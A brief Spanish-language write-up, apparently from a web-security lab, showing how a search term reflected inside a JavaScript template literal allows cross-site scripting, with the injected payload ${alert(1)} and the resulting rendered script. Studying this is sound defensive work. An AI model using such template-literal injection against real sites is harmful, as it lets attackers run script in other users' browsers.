Si buscamos cualquier cosa, por ejemplo hola, en el buscador, hay un script que lo recibe de la siguiente manera: 
```
<script>
	var message = `0 search results for 'hola'`;
	document.getElementById('searchMessage').innerText = message;
</script>
```

Entonces si ponemos directamente en la barra de búsqueda: 
```
${alert(1)}
```

Se renderizará de la siguiente manera y saltará la alerta:
```
<script>
	var message = `0 search results for '${alert(1)}'`;
	document.getElementById('searchMessage').innerText = message;                 </script>
```
